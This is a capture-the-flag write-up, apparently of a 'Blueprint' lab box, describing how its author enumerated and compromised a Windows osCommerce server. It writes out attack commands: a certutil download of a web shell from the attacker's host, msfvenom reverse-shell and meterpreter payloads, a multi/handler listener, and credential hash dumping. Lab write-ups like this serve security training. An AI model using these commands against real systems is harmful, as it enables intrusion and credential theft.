## Blueprint

---

Tags: Windows, web server, website, CVE, php shell

Tools: nmap, burpsuite, dirb, smbmap, smbclient, sqlmap, exploit-db, python, php, revshells.com, wireshark, certutil, metasploit, msfconsole, msfvenom, crackstation

Process:

* I started off with an nmap scan as usual. This time I just started with a `nmap -Pn <IP> > <file>` because the previous boxed required -Pn. Then I used the ports found with that scan in a `nmap -A -p<Comma separated ports from previous scan> <IP> > <file>`

* Port 80 is open and the nmap scan says the TRACE method is enabled, so I tried navigating to "http://\<ip\>/" and sending a trace request to the web server via burpsuite. I got 404 and 501 errors respectively.

* These error make me think that the webserver is running but doesn't have an index.html or doesn't automatically forward to a webpage and I would have to find the page/directories myself. I started a scan with dirb.

* While that scan is running

    * I moved on to port 8080. "http://\<ip\>:8080"

        * This had a directory with some folders and navigating to catalog gives an eshop while there is another folder with docs

        * There's a db schema in the docs, which probably corresponds to the db on port 3306, but `sqlmap` couldn't connect, and after trying to connect in the browser (so essentially a GET request), it said I couldn't connect and it looks like I'll have to pivot to access it.

    * I also ran a `smbmap <ip> -u anonymous` scan and was able to get a share list

        * I connected to the readonly users share with `smbclient \\\\<ip>\\Users -U anonymous`

        * This worked. I got into the share, but I'm not sure that there was anything valuable. The only thing was NTUSER.DAT files which I may investigate further later if nothing else is happening as I'm fairly certain these aren't helpful to the attack.

* Next, I searched the name of the eshop framework "osCommerce" on `exploit-db` and there are many exploits.

* I copy and pasted the exploit from "https://www.exploit-db.com/exploits/50128" into a python file and ran it. This gave me a system level shell on the machine!

* The problem is that this shell was... not great. I couldn't change directories and many commands didn't return any output.

* So, I went back and repeated the exploit-db process with "https://www.exploit-db.com/exploits/44374" and inserted the correct addresses and payload from `revshells.com`

* It looks like the system command was disabled for security. Maybe I misconfigured. I retried by inserting the payload differently. I did this a few different ways and it seems that I have botched the exploit bad enough to warrant trying a restart of the machine...

* It turns out all I had to do was use `exec()` instead of `system()` for the payload in the exploit. I verified using `wireshark` and inserting a ping command to myself as the payload.

* I then changed the injected command to make it download a PentestMonkey PHP shell from my machine and then went to the exploit directory on the server and changed the file being accessed from config.php to my shell.php

    * `certutil` is apparently standard on windows machines and is a way to perform functions alternative to curl and wget which I was trying to no avail.

    * using `shell_exec()` worked, but I believe `exec()` did as well. I prepended `echo` to the payload to more easily debug when I visited the exploit page.

    * The final command I ended up using for the payload was `echo shell_exec("certutil -urlcache -f http://<my IP>:<my port>/shell.php shell.php")`

* Finally, after MUCH tweaking approaches, I used `echo shell_exec("certutil -urlcache -f http://<my IP>:<my port>/shell.php shell.php")` after making an msfvenom payload `msfvenom -p php/reverse_php LHOST=<my ip> LPORT<my port> -o shell.php`

* After like an hour and a half... this shell has the same problem as the earlier one... time to try msfconsole again...

* The reason msf didn't work earlier was because I needed to set the URI properly. I just opened msf, searched for osCommerce, went through every option making sure it was set properly, and ran it. This worked.

* This shell was again unstable though... So I made a msfvenom payload with `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<my ip> LPORT=<my port> -f exe -o shell.exe`

    * I opened a new msfconsole using multi/handler, *set the payload to match the msfvenom payload*, set the LHOST and LPORT to mine and ran it

    * On the first msf I uploaded and ran execute -f shell.exe

* *Finally*, a stable shell! Experience is the cost of learning, no matter how frusterating it is at the time.

* I grabbed the NTLM hash for the first flag with hashdump

    * I cracked the hash with `crackstation`

* I navigated to Administrator's Desktop for the root flag.

---